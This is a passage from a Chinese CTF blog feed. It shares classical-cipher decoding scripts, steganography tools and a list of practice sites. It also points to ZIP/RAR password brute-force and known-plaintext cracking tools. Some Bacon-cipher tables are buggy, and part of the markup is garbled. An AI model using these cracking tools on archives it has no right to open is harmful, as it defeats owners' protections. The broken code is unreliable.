class="string">‘A’</span>,</div><div class="line">    <span class="string">‘AAAAB’</span> : <span class="string">‘B’</span>,</div><div class="line">    <span class="string">‘AAABA’</span> : <span class="string">‘C’</span>,</div><div class="line">    <span class="string">‘AAABB’</span> : <span class="string">‘D’</span>,</div><div class="line">    <span class="string">‘AABAA’</span> : <span class="string">‘E’</span>,</div><div class="line">    <span class="string">‘AABAB’</span> : <span class="string">‘F’</span>,</div><div class="line">    <span class="string">‘AABBA’</span> : <span class="string">‘G’</span>,</div><div class="line">    <span class="string">‘AABBB’</span> : <span class="string">‘H’</span>,</div><div class="line">    <span class="string">‘ABAAA’</span> : <span class="string">‘I’</span>,</div><div class="line">    <span class="string">‘ABAAB’</span> : <span class="string">‘J’</span>,</div><div class="line">    <span class="string">‘ABABA’</span> : <span class="string">‘K’</span>,</div><div class="line">    <span class="string">‘ABABB’</span> : <span class="string">‘L’</span>,</div><div class="line">    <span class="string">‘ABBAB’</span> : <span class="string">‘N’</span>,</div><div class="line">    <span class="string">‘ABBBA’</span> : <span class="string">‘O’</span>,</div><div class="line">    <span class="string">‘ABBBB’</span> : <span class="string">‘P’</span>,</div><div class="line">    <span class="string">‘BAAAA’</span> : <span class="string">‘Q’</span>,</div><div class="line">    <span class="string">‘BAAAB’</span> : <span class="string">‘R’</span>,</div><div class="line">    <span class="string">‘BAABA’</span> : <span class="string">‘S’</span>,</div><div class="line">    <span class="string">‘BAABB’</span> : <span class="string">‘T’</span>,</div><div class="line">    <span class="string">‘BABAA’</span> : <span class="string">‘U’</span>,</div><div class="line">    <span class="string">‘BABAB’</span> : <span class="string">‘V’</span>,</div><div class="line">    <span class="string">‘BABBA’</span> : <span class="string">‘W’</span>,</div><div class="line">    <span class="string">‘BABBB’</span> : <span class="string">‘X’</span>,</div><div class="line">    <span class="string">‘BBAAA’</span> : <span class="string">‘Y’</span>,</div><div class="line">    <span class="string">‘BBAAB’</span> : <span class="string">‘Z’</span></div><div class="line">    }</div><div class="line">    output = <span class="string">‘’</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(m) - <span class="number">4</span>, <span class="number">5</span>):</div><div class="line">        temp = m[i: i + <span class="number">5</span>]</div><div class="line">        output += basic1[temp]</div><div class="line">    <span class="keyword">return</span> output</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">peig2</span><span class="params">(m)</span>:</span></div><div class="line"></div><div class="line">    basic2 = {</div><div class="line">    <span class="string">‘AAAAA’</span> : <span class="string">‘A’</span>,</div><div class="line">    <span class="string">‘AAAAB’</span> : <span class="string">‘B’</span>,</div><div class="line">    <span class="string">‘AAABA’</span> : <span class="string">‘C’</span>,</div><div class="line">    <span class="string">‘AAABB’</span> : <span class="string">‘D’</span>,</div><div class="line">    <span class="string">‘AABAA’</span> : <span class="string">‘E’</span>,</div><div class="line">    <span class="string">‘AABAB’</span> : <span class="string">‘F’</span>,</div><div class="line">    <span class="string">‘AABBA’</span> : <span class="string">‘G’</span>,</div><div class="line">    <span class="string">‘AABBB’</span> : <span class="string">‘H’</span>,</div><div class="line">    <span class="string">‘ABAAA’</span> : <span class="string">‘I’</span>,</div><div class="line">    <span class="string">‘ABAAA’</span> : <span class="string">‘J’</span>,</div><div class="line">    <span class="string">‘ABAAB’</span> : <span class="string">‘K’</span>,</div><div class="line">    <span class="string">‘ABABA’</span> : <span class="string">‘L’</span>,</div><div class="line">    <span class="string">‘ABABB’</span> : <span class="string">‘M’</span>,</div><div class="line">    <span class="string">‘ABBAA’</span> : <span class="string">‘N’</span>,</div><div class="line">    <span class="string">‘ABBAB’</span> : <span class="string">‘O’</span>,</div><div class="line">    <span class="string">‘ABBBA’</span> : <span class="string">‘P’</span>,</div><div class="line">    <span class="string">‘ABBBB’</span> : <span class="string">‘Q’</span>,</div><div class="line">    <span class="string">‘BAAAA’</span> : <span class="string">‘R’</span>,</div><div class="line">    <span class="string">‘BAAAB’</span> : <span class="string">‘S’</span>,</div><div class="line">    <span class="string">‘BAABA’</span> : <span class="string">‘T’</span>,</div><div class="line">    <span class="string">‘BAABB’</span> : <span class="string">‘U’</span>,</div><div class="line">    <span class="string">‘BAABB’</span> : <span class="string">‘V’</span>,</div><div class="line">    <span class="string">‘BABAA’</span> : <span class="string">‘W’</span>,</div><div class="line">    <span class="string">‘BABAB’</span> : <span class="string">‘X’</span>,</div><div class="line">    <span class="string">‘BABBA’</span> : <span class="string">‘Y’</span>,</div><div class="line">    <span class="string">‘BABBB’</span> : <span class="string">‘Z’</span></div><div class="line">    }</div><div class="line">    output = <span class="string">‘’</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(m) - <span class="number">4</span>, <span class="number">5</span>):</div><div class="line">        temp = m[i: i + <span class="number">5</span>]</div><div class="line">        output += basic2[temp]</div><div class="line">    <span class="keyword">return</span> output</div><div class="line"></div><div class="line"><span class="keyword">if</span> <strong>name</strong> == <span class="string">‘<strong>main</strong>‘</span>:</div><div class="line">    </div><div class="line">    m = raw_input(<span class="string">“请输入密文:”</span>)</div><div class="line">    mode = input(<span class="string">“选择密文对应的方式 1 or 2：”</span>)</div><div class="line">    <span class="keyword">if</span> len(m)%<span class="number">5</span> == <span class="number">0</span>:</div><div class="line">        l = []</div><div class="line">        k = []</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(m)/<span class="number">5</span>):</div><div class="line">            l.append(m[:<span class="number">5</span>])</div><div class="line">            m = m[<span class="number">5</span>:]</div><div class="line">        <span class="keyword">if</span> mode == <span class="number">1</span>:</div><div class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> l:</div><div class="line">                <span class="keyword">if</span> i.isupper():</div><div class="line">                    k.append(peig1(i))</div><div class="line">                <span class="keyword">else</span>:</div><div class="line">                    i = i.upper()</div><div class="line">                    k.append(peig1(i))</div><div class="line"></div><div class="line">        <span class="keyword">elif</span> mode == <span class="number">2</span>:</div><div class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> l:</div><div class="line">                <span class="keyword">if</span> i.isupper():</div><div class="line">                    k.append(peig2(i))</div><div class="line">                <span class="keyword">else</span>:</div><div class="line">                    i = i.upper()</div><div class="line">                    k.append(peig2(i))</div><div class="line">        flag = <span class="string">‘’</span></div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> k:</div><div class="line">            flag+=i[<span class="number">0</span>]</div><div class="line">        <span class="keyword">print</span> flag</div></pre></td></tr></tbody></table></figure>

<h2><span id="栅栏密码">栅栏密码</span></h2><p>(1) 一个win平台下的<a href="http://oayoilchh.bkt.clouddn.com/%E6%A0%85%E6%A0%8F%E5%AF%86%E7%A0%81%E5%8A%A0%E8%A7%A3%E5%AF%861.10.exe" target="_blank" rel="noopener">软件</a><br><a href="http://oayoilchh.bkt.clouddn.com/2016/07/27/14:49:39%20" target="_blank" rel="noopener"><img src="http://oayoilchh.bkt.clouddn.com/2016/07/27/14:49:39%20" alt=""></a><br>（2）<code>python脚本</code></p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#author:Swing</span></div><div class="line"><span class="comment">#通用脚本</span></div><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -<em>- coding: utf_8 -</em>-</span></div><div class="line">e = raw_input(<span class="string">‘请输入要解密的字符串\n’</span>)</div><div class="line">elen = len(e)</div><div class="line">field=[]</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,elen):</div><div class="line">            <span class="keyword">if</span>(elen%i==<span class="number">0</span>):</div><div class="line">                field.append(i)</div><div class="line"><span class="keyword">for</span> f <span class="keyword">in</span> field:</div><div class="line">    b = elen / f</div><div class="line">    result = {x:<span class="string">‘’</span> <span class="keyword">for</span> x <span class="keyword">in</span> range(b)}</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(elen):</div><div class="line">        a = i % b;</div><div class="line">        result.update({a:result[a] + e[i]})</div><div class="line">    d = <span class="string">‘’</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(b):</div><div class="line">        d = d + result[i]</div><div class="line">    <span class="keyword">print</span> <span class="string">‘分为\t’</span>+str(f)+<span class="string">‘\t’</span>+<span class="string">‘栏时，解密结果为：  ‘</span>+d</div></pre></td></tr></tbody></table></figure>

<h2><span id="凯撒密码">凯撒密码</span></h2><p>凯撒密码(Caesar Cipher或称恺撒加密、恺撒变换、变换加密、位移加密)是一种替换加密，明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。例，当偏移量是3的时候，所有的字母A将被替换成D，B变成E，以此类推，更多<a href="https://en.wikipedia.org/wiki/Caesar_cipher" target="_blank" rel="noopener">参考</a><br>位移参考<br><a href="http://oayoilchh.bkt.clouddn.com/2016/07/27/15:00:45%20" target="_blank" rel="noopener"><img src="http://oayoilchh.bkt.clouddn.com/2016/07/27/15:00:45%20" alt=""></a><br>(1)<a href="http://planetcalc.com/1434/" target="_blank" rel="noopener">网站链接</a> 这个网站可以列出1-26的可能性<br>(1)还有一种方法就是利用<a href="http://" target="_blank" rel="noopener">JPK</a>这个工具<br>使用方法看图就够了吧 <a href="http://oayoilchh.bkt.clouddn.com/2016/07/27/15:32:31%20" target="_blank" rel="noopener"><img src="http://oayoilchh.bkt.clouddn.com/2016/07/27/15:32:31%20" alt=""></a><br>(3)<code>Python实现</code></p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#! /usr/bin/env python</span></div><div class="line"><span class="comment"># coding=utf-8</span></div><div class="line"><span class="comment">#<strong>author</strong> = ‘tyomcat’</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert</span><span class="params">(c, key, start = <span class="string">‘a’</span>, n = <span class="number">26</span>)</span>:</span></div><div class="line">    a = ord(start)</div><div class="line">    offset = ((ord(c) - a + key)%n)</div><div class="line">    <span class="keyword">return</span> chr(a + offset)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">caesarEncode</span><span class="params">(s, key)</span>:</span></div><div class="line">    o = <span class="string">“”</span></div><div class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> s:</div><div class="line">        <span class="keyword">if</span> c.islower():</div><div class="line">            o+= convert(c, key, <span class="string">‘a’</span>)</div><div class="line">        <span class="keyword">elif</span> c.isupper():</div><div class="line">            o+= convert(c, key, <span class="string">‘A’</span>)</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            o+= c</div><div class="line">    <span class="keyword">return</span> o</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">caesarDecode</span><span class="params">(s, key)</span>:</span></div><div class="line">    <span class="keyword">return</span> caesarEncode(s, -key)</div><div class="line"><span class="keyword">if</span> <strong>name</strong> == <span class="string">‘<strong>main</strong>‘</span>:</div><div class="line"></div><div class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> range(<span class="number">27</span>):</div><div class="line">       e=<span class="string">‘Jr1p0zr2VfPp’</span>     <span class="comment">#写这里</span></div><div class="line">       d = caesarDecode(e, key)</div><div class="line"></div><div class="line">       <span class="keyword">print</span> d</div><div class="line">       <span class="keyword">print</span> <span class="string">‘\n’</span></div><div class="line"><code>python&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;## 简单替换密码&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;简单换位密码(Simple Substitution Cipher)加密方式是以每个明文字母被与之唯一对应且不同的字母替换的方式实现的，它不同于恺撒密码，因为密码字母表的字母不是简单的移位，而是完全是混乱的 例如：&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;</code>code</div><div class="line">明文字母 : abcdefghijklmnopqrstuvwxyz</div><div class="line">明文字母 : phqgiumeaylnofdxjkrcvstzwb</div></pre></td></tr></tbody></table></figure>

<p>其实我感觉有点像是词频攻击就可以解决所以我（麦香师傅告诉我才知道的）推荐一个词频攻击的网站<code>要有梯子</code><a href="http://quipqiup.com/index.php" target="_blank" rel="noopener">http://quipqiup.com/index.php</a></p>
<h2><span id="猪圈密码">猪圈密码</span></h2><p>猪圈密码(Pigpen Cipher或称九宫格密码、朱高密码、共济会密码或共济会员密码)，是一种以格子为基础的简单替代式密码<br>明文和密文对应：<br><a href="http://oayoilchh.bkt.clouddn.com/2016/07/27/15:51:15%20" target="_blank" rel="noopener"><img src="http://oayoilchh.bkt.clouddn.com/2016/07/27/15:51:15%20" alt=""></a><br>在线解密<a href="http://www.simonsingh.net/The_Black_Chamber/pigpen.html" target="_blank" rel="noopener">飞机票</a><br>上面是正常的对应 我见过一种变形的 与其说是猪圈不如说是替换<br>替换规则是 左右字母替换<br><a href="http://oayoilchh.bkt.clouddn.com/2016/07/27/15:56:11%20" target="_blank" rel="noopener"><img src="http://oayoilchh.bkt.clouddn.com/2016/07/27/15:56:11%20" alt=""></a><br>右边的跟左边的一一对应，在左边的换成右边<br><code>2015年广东强网杯 小心猪圈</code>的题目就是这样的<br>附上我的脚本</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"></div><div class="line">s=raw_input()</div><div class="line">Key = {</div><div class="line">    <span class="string">‘a’</span>:<span class="string">‘j’</span>,</div><div class="line">    <span class="string">‘b’</span>:<span class="string">‘k’</span>,</div><div class="line">    <span class="string">‘c’</span>:<span class="string">‘l’</span>,</div><div class="line">    <span class="string">‘d’</span>:<span class="string">‘m’</span>,</div><div class="line">    <span class="string">‘e’</span>:<span class="string">‘n’</span>,</div><div class="line">    <span class="string">‘f’</span>:<span class="string">‘o’</span>,</div><div class="line">    <span class="string">‘g’</span>:<span class="string">‘p’</span>,</div><div class="line">    <span class="string">‘h’</span>:<span class="string">‘q’</span>,</div><div class="line">    <span class="string">‘i’</span>:<span class="string">‘r’</span>,</div><div class="line">    <span class="string">‘s’</span>:<span class="string">‘w’</span>,</div><div class="line">    <span class="string">‘t’</span>:<span class="string">‘x’</span>,</div><div class="line">    <span class="string">‘u’</span>:<span class="string">‘y’</span>,</div><div class="line">    <span class="string">‘v’</span>:<span class="string">‘z’</span>,</div><div class="line">    <span class="string">‘-‘</span>:<span class="string">‘-‘</span>,</div><div class="line">    <span class="string">‘{‘</span>:<span class="string">‘{‘</span>,</div><div class="line">    <span class="string">‘}’</span>:<span class="string">‘}’</span>,</div><div class="line">    <span class="string">‘j’</span>:<span class="string">‘a’</span>,</div><div class="line">    <span class="string">‘k’</span>:<span class="string">‘b’</span>,</div><div class="line">    <span class="string">‘l’</span>:<span class="string">‘c’</span>,</div><div class="line">    <span class="string">‘m’</span>:<span class="string">‘d’</span>,</div><div class="line">    <span class="string">‘n’</span>:<span class="string">‘e’</span>,</div><div class="line">    <span class="string">‘o’</span>:<span class="string">‘f’</span>,</div><div class="line">    <span class="string">‘p’</span>:<span class="string">‘g’</span>,</div><div class="line">    <span class="string">‘q’</span>:<span class="string">‘h’</span>,</div><div class="line">    <span class="string">‘r’</span>:<span class="string">‘i’</span>,</div><div class="line">    <span class="string">‘w’</span>:<span class="string">‘s’</span>,</div><div class="line">    <span class="string">‘x’</span>:<span class="string">‘t’</span>,</div><div class="line">    <span class="string">‘y’</span>:<span class="string">‘u’</span>,</div><div class="line">    <span class="string">‘z’</span>:<span class="string">‘v’</span></div><div class="line">}</div><div class="line">output1 = <span class="string">‘’</span></div><div class="line"><span class="keyword">for</span> i  <span class="keyword">in</span> range(<span class="number">0</span>,len(s)):</div><div class="line">     temp=s[i]</div><div class="line">     output1+=Key[temp]</div><div class="line"><span class="keyword">print</span> output1</div></pre></td></tr></tbody></table></figure>

<p>更多关于密码学和编码的问题可以参考<a href="https://www.hackfun.org/CTF/coding-and-encryption-of-those-brain-holes-in-CTF.html" target="_blank" rel="noopener">4ido10n表哥的博文</a></p>
<h1><span id="隐写工具">隐写工具</span></h1><h2><span id="stegsolve">Stegsolve</span></h2><p>图片隐写的神器 <a href="https://yunpan.cn/c6jV9E9ZevwdF" target="_blank" rel="noopener">下载的传送门</a>（提取码：c146）<br><a href="http://oayoilchh.bkt.clouddn.com/2016/07/27/16:20:30%20" target="_blank" rel="noopener"><img src="http://oayoilchh.bkt.clouddn.com/2016/07/27/16:20:30%20" alt=""></a><br>具体可以自己尝试 简单介绍几下两个功能</p>
<ol>
<li>Stereogram Solver<br>这个功能可以从不同通道去分析图片</li>
<li>Frame Browser<br>这个功能是如果这张图片里面还藏这另外一张图片的话 他可以分离出来</li>
<li><p>Image Combiner<br>这个功能可以对比两张图片 最终Sub出不一样的地方</p>
<h2><span id="pngcheck">pngcheck</span></h2><p><code>pngcheck.exe -v sctf.png</code><br><code>这个是Dos下的工具 win32平台的</code><br><a href="https://yunpan.cn/c6jjU9MsIWkWv" target="_blank" rel="noopener">下载传送门</a> （提取码：f47b）<br>他的功能是检测png格式图片的损坏位置 一般用来对PNG隐写进行修复会用到</p>
<h2><span id="stegdetect">stegdetect</span></h2><p>这个东西是用来检测图片的隐写方式的 它可以检测到通过JSteg、JPHide、OutGuess、Invisible Secrets、F5、appendX和Camouflage等这些隐写工具隐藏的信息<br><a href="https://yunpan.cn/c6jwUT7EA9ywW" target="_blank" rel="noopener">下载传送门</a> （提取码：4c2e）<br><a href="http://oayoilchh.bkt.clouddn.com/2016/07/27/16:35:39%20" target="_blank" rel="noopener"><img src="http://oayoilchh.bkt.clouddn.com/2016/07/27/16:35:39%20" alt=""></a><br>比如图中就可以看出他是<code>Jphide</code>隐写<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">使用规则:</div><div class="line">    q 仅显示可能包含隐藏内容的图像。</div><div class="line">-n 启用检查JPEG文件头功能，以降低误报率。如果启用，所有带有批注区域的文件将被视为没有被嵌入信息。如果JPEG文件的JFIF标识符中的版本号不是1.1，则禁用OutGuess检测。</div><div class="line">-s 修改检测算法的敏感度，该值的默认值为1。检测结果的匹配度与检测算法的敏感度成正比，算法敏感度的值越大，检测出的可疑文件包含敏感信息的可能性越大。</div><div class="line">-d 打印带行号的调试信息。</div><div class="line">-t 设置要检测哪些隐写工具（默认检测jopi），可设置的选项如下：</div><div class="line">j 检测图像中的信息是否是用jsteg嵌入的。</div><div class="line">o 检测图像中的信息是否是用outguess嵌入的。</div><div class="line">p 检测图像中的信息是否是用jphide嵌入的。</div><div class="line">i 检测图像中的信息是否是用invisible secrets嵌入的。</div><div class="line">-V 显示软件版本号。</div><div class="line">如果检测结果显示该文件可能包含隐藏信息，那么Stegdetect会在检测结果后面使用1～3颗星来标识</div><div class="line">隐藏信息存在的可能性大小，3颗星表示隐藏信息存在的可能性最大。</div></pre></td></tr></tbody></table></figure></p>
</li>
</ol>
<h2><span id="jphide">Jphide</span></h2><p>先推荐表哥的博文 他写得好详细<a href="https://www.hackfun.org/CTF/jphide-steganography.html" target="_blank" rel="noopener">传送门</a><br><a href="http://linux01.gwdg.de/~alatham/stego.html" target="_blank" rel="noopener">下载传送门</a><br><a href="http://oayoilchh.bkt.clouddn.com/2016/07/27/16:45:16%20" target="_blank" rel="noopener"><img src="http://oayoilchh.bkt.clouddn.com/2016/07/27/16:45:16%20" alt=""></a><br><code>左边是隐写 右边是提取隐写文件</code></p>
<h2><span id="winhex">Winhex</span></h2><p>二进制文件打开方式</p>
<h2><span id="wbs43open">wbs43open</span></h2><p><code>PDF</code>文件隐写的不二选择 <a href="https://yunpan.cn/c6jcYbgFjajmp" target="_blank" rel="noopener">下载传送门</a> （提取码：2336）<br><a href="http://oayoilchh.bkt.clouddn.com/2016/07/27/16:53:39%20" target="_blank" rel="noopener"><img src="http://oayoilchh.bkt.clouddn.com/2016/07/27/16:53:39%20" alt=""></a></p>
<h2><span id="iamge-stganograpy">Iamge Stganograpy</span></h2><p>这也是一个图片的隐写工具<br>当初死活在谷歌 百度等地方都找不到 最后<code>白师傅</code>在搜狗找到了…<br><a href="http://imagesteganography.codeplex.com/" target="_blank" rel="noopener">下载传送门</a></p>
<h2><span id="f5算法隐写实现">F5算法隐写实现</span></h2><p><a href="https://yunpan.cn/c6jdvEtep8guk" target="_blank" rel="noopener">下载传送门</a> （提取码：c033)</p>
<h2><span id="silenteye音频隐写">silenteye(音频隐写）</span></h2><p><a href="http://oayoilchh.bkt.clouddn.com/2016/07/27/17:13:24%20" target="_blank" rel="noopener"><img src="http://oayoilchh.bkt.clouddn.com/2016/07/27/17:13:24%20" alt=""></a></p>
<h2><span id="mp3stego">MP3Stego</span></h2><p>顾名思义 这是一个款音频隐写工具<a href="http://www.petitcolas.net/steganography/mp3stego/" target="_blank" rel="noopener">下载传送门</a></p>
<figure class="highlight tp"><table><tbody><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">用MP3Stego进行加密解密：</div><div class="line"></div><div class="line">加密：encode -E 加密文本 -<span class="keyword">P</span> 密码  mp<span class="number">3</span>文件</div><div class="line"></div><div class="line">解密：decode -<span class="keyword">X</span> -<span class="keyword">P</span>  密码  mp<span class="number">3</span>文件</div></pre></td></tr></tbody></table></figure>

<h2><span id="outguess">Outguess</span></h2><p>2016-08-04 21:07:46<br>今天遇到的一个隐写工具 CSDN有源码</p>
<figure class="highlight plain"><figcaption><span>code</span></figcaption><table><tbody><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./configure &amp;&amp; make &amp;&amp; make install</div></pre></td></tr></tbody></table></figure>

<p>使用方法<code>outguess</code>就能看到使用方法啦</p>
<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">outguess -r bystudent.jpg outfile.txt</div></pre></td></tr></tbody></table></figure>

<p><strong>这个隐写方式也是可以通过stegdetect</strong>检测出来的</p>
<h1><span id="other">Other</span></h1><h2><span id="yafu">Yafu</span></h2><p>大整数分解 <a href="https://yunpan.cn/c6jHKGCbiwEPJ" target="_blank" rel="noopener">下载传送门</a>（提取码：16f4）<br><a href="http://oayoilchh.bkt.clouddn.com/2016/07/27/17:19:36%20" target="_blank" rel="noopener"><img src="http://oayoilchh.bkt.clouddn.com/2016/07/27/17:19:36%20" alt=""></a></p>
<figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="title">factor</span><span class="params">(要分解的整数)</span></span></div></pre></td></tr></tbody></table></figure>

<h2><span id="ziperello">Ziperello</span></h2><p><code>ZIP</code>压缩包暴力破解 <a href="https://yunpan.cn/c6jFbIaYXFQxw" target="_blank" rel="noopener">下载传送门</a>（提取码：324a)<br><a href="http://oayoilchh.bkt.clouddn.com/2016/07/27/17:43:00%20" target="_blank" rel="noopener"><img src="http://oayoilchh.bkt.clouddn.com/2016/07/27/17:43:00%20" alt=""></a></p>
<h2><span id="arpr-ha">ARPR-ha</span></h2><p><code>RAR</code>暴力破解 <a href="https://yunpan.cn/c6jFCzLhVDGbX" target="_blank" rel="noopener">下载传送门</a> （提取码：6092）</p>
<h2><span id="aapasswordrecovery">AAPasswordRecovery</span></h2><p>ZIP /RAR等压缩软件的破解工具 <a href="https://yunpan.cn/c6jL27k6Nvfvc" target="_blank" rel="noopener"></a> （提取码：f6c7)<br>可支持多种破解方式<br>包括</p>
<p><ol></ol></p>
<p><li>明文攻击</li></p>
<p><li>暴力破解</li></p>
<p><li>字典攻击<br><a href="http://oayoilchh.bkt.clouddn.com/2016/07/27/17:49:27%20" target="_blank" rel="noopener"><img src="http://oayoilchh.bkt.clouddn.com/2016/07/27/17:49:27%20" alt=""></a></li></p>
<h2><span id="pkcrack">PKCrack</span></h2><p><code>ZIP</code>明文破解工具 <a href="http://www.unix-ag.uni-kl.de/~conrad/krypto/pkcrack.html" target="_blank" rel="noopener">下载传送门</a><br><a href="http://blog.csdn.net/jiangwlee/article/details/6911087" target="_blank" rel="noopener">详细使用方法请看这</a></p>
<h1><span id="最后">最后</span></h1><p><a href="http://www.codefrom.com/c/43" target="_blank" rel="noopener"><code>CTF常用工具集合</code></a><br><a href="https://www.hackfun.org/CTF/coding-and-encryption-of-those-brain-holes-in-CTF.html" target="_blank" rel="noopener"><code>表哥的编码解码博文</code></a><br><a href="http://bobao.360.cn/learning/detail/243.html" target="_blank" rel="noopener"><code>CTF隐写总结</code></a></p>
<ul>
<li>转载自<a href="http://www.wing3.cn" target="_blank" rel="noopener">Swing’s Blog</a>文章<a href="http://www.wing3.cn/2016/04/25/tools/" target="_blank" rel="noopener">《工具以及脚本的整理》</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[入CTF坑必不可少的地方]]></title>
      <url>https://uknowsec.cn/posts/ctf/%E5%85%A5CTF%E5%9D%91%E5%BF%85%E4%B8%8D%E5%8F%AF%E5%B0%91%E7%9A%84%E5%9C%B0%E6%96%B9.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E5%9B%BE%E7%89%8720161004230538.jpg" alt="ctf"><br><strong>0x00 前言</strong></p>
<p>没有交易，没有买卖，没有排名，纯属分享</p>
<p><strong>0x01 CTF介绍</strong></p>
<ul>
<li><a href="http://blog.idf.cn/2015/02/ctf-field-guide/" target="_blank" rel="noopener">CTF领域指南</a></li>
<li><a href="http://tieba.baidu.com/p/3933947157" target="_blank" rel="noopener">CTF介绍大全</a></li>
<li><a href="https://ctftime.org/event/list/upcoming" target="_blank" rel="noopener">CTF赛事预告</a></li>
</ul>
<p><strong>0x02 CTF练习</strong></p>
<ul>
<li><strong>BIN:</strong></li>
<li><a href="http://reversing.kr/" target="_blank" rel="noopener">reversing</a></li>
<li><a href="http://pwnable.kr/" target="_blank" rel="noopener">pwnable</a></li>
<li><a href="http://crackmes.de/" target="_blank" rel="noopener">crackmes</a></li>
<li><a href="http://exploit-exercises.com/" target="_blank" rel="noopener">exploit-exercises</a></li>
<li><a href="http://overthewire.org/" target="_blank" rel="noopener">overthewire</a></li>
<li><a href="https://io.netgarage.org" target="_blank" rel="noopener">netgarage</a></li>
<li><a href="http://security.cs.rpi.edu/courses/binexp-spring2015/" target="_blank" rel="noopener">bin干货</a></li>
<li><a href="http://www.52pojie.cn/forum-67-1.html" target="_blank" rel="noopener">2014CrackMe大赛</a></li>
<li><a href="http://www.52pojie.cn/forum-71-1.html" target="_blank" rel="noopener">吾爱破解2016安全挑战赛</a></li>
<li><p><a href="http://bbs.pediy.com/forumdisplay.php?f=109" target="_blank" rel="noopener">看雪安全论坛历年安全大赛</a></p>
</li>
<li><p><strong> SQL:</strong></p>
</li>
<li><a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">sqli-labs</a></li>
<li><p><a href="http://redtiger.labs.overthewire.org/" target="_blank" rel="noopener">RedTigers Hackit</a></p>
</li>
<li><p><strong>XSS:</strong></p>
</li>
<li><a href="http://xss.pkav.net/xss/" target="_blank" rel="noopener">乌云XSS互动学习平台</a></li>
<li><a href="http://prompt.ml/" target="_blank" rel="noopener">prompt</a></li>
<li><a href="http://xss-quiz.int21h.jp/http://escape.alf.nu/" target="_blank" rel="noopener">XSS Challenges</a></li>
<li><a href="http://escape.alf.nu/" target="_blank" rel="noopener">escape</a></li>
<li><p><a href="https://xss-game.appspot.com/" target="_blank" rel="noopener">xss-game</a></p>
</li>
<li><p><strong>国内综合练习：</strong></p>
</li>
<li><a href="http://www.sangebaimao.com/challenge/list" target="_blank" rel="noopener">三个白帽</a></li>
